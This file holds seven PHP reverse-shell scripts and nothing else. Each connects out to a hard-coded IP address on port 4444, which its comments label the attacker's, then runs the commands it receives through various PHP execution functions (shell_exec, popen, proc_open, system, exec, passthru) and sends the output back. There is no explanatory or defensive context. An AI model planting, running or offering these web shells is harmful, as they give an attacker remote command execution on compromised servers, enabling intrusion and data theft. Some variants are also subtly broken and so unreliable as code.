<?php
set_time_limit(0);
$ip = '159.203.174.136'; // Attacker's IP
$port = 4444;            // Attacker's port

// Open the socket connection
$sock = fsockopen($ip, $port);

if ($sock) {
    while ($cmd = fgets($sock, 1024)) {
        $output = shell_exec($cmd);  // Execute the command
        fwrite($sock, $output);      // Send the output back to the attacker
    }
}
?>



<?php
set_time_limit(0);
$ip = '159.203.174.136'; // Attacker's IP
$port = 4444;            // Attacker's port

// Open a connection to the attacker's machine
$socket = fsockopen($ip, $port);
if ($socket) {
    $process = popen('sh', 'w'); // Open a shell process
    while (fgets($socket, 128)) {
        fwrite($process, fgets($socket, 128)); // Send received input to the shell
        fwrite($socket, fgets($process, 128)); // Send shell output back to the attacker
    }
}
?>


<?php
set_time_limit(0);
$ip = '159.203.174.136'; // Attacker's IP
$port = 4444;            // Attacker's port

// Create a socket connection
$sock = fsockopen($ip, $port);
if ($sock) {
    $descriptorspec = [
        0 => ["pipe", "r"],  // stdin
        1 => ["pipe", "w"],  // stdout
        2 => ["pipe", "w"]   // stderr
    ];

    $process = proc_open('sh', $descriptorspec, $pipes);
    if (is_resource($process)) {
        while (1) {
            $input = fgets($sock, 1024);
            fwrite($pipes[0], $input);  // Send the input to the shell

            $output = fgets($pipes[1], 1024);  // Get the output from the shell
            fwrite($sock, $output);            // Send the output back to the attacker

            $error = fgets($pipes[2], 1024);   // Get any error output
            fwrite($sock, $error);             // Send error back to attacker
        }
        fclose($sock);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
}
?>


<?php
set_time_limit(0);
$ip = '159.203.174.136'; // Attacker's IP
$port = 4444;            // Attacker's port

// Open the socket
$sock = fsockopen($ip, $port);

if ($sock) {
    while ($cmd = fgets($sock, 1024)) {
        $output = system($cmd); // Execute system command
        fwrite($sock, $output); // Send output back to the attacker
    }
}
?>


<?php
set_time_limit(0);
$ip = '159.203.174.136'; // Attacker's IP
$port = 4444;            // Attacker's port

// Open a socket connection to the attacker
$sock = fsockopen($ip, $port);

if ($sock) {
    while ($cmd = fgets($sock, 1024)) {
        $output = shell_exec($cmd); // Execute command using shell_exec
        fwrite($sock, $output);     // Send back the result
    }
}
?>

<?php
set_time_limit(0);
$ip = '159.203.174.136'; // Attacker's IP
$port = 4444;            // Attacker's port

// Create the socket
$sock = fsockopen($ip, $port);
if ($sock) {
    while ($cmd = fgets($sock, 1024)) {
        $output = exec($cmd);  // Execute the command via exec()
        fwrite($sock, $output); // Return output back to the attacker
    }
}
?>


<?php
set_time_limit(0);
$ip = '159.203.174.136'; // Attacker's IP
$port = 4444;            // Attacker's port

// Open socket connection
$sock = fsockopen($ip, $port);
if ($sock) {
    while ($cmd = fgets($sock, 1024)) {
        $output = passthru($cmd); // Execute and display command output
        fwrite($sock, $output);   // Send the output back
    }
}
?>
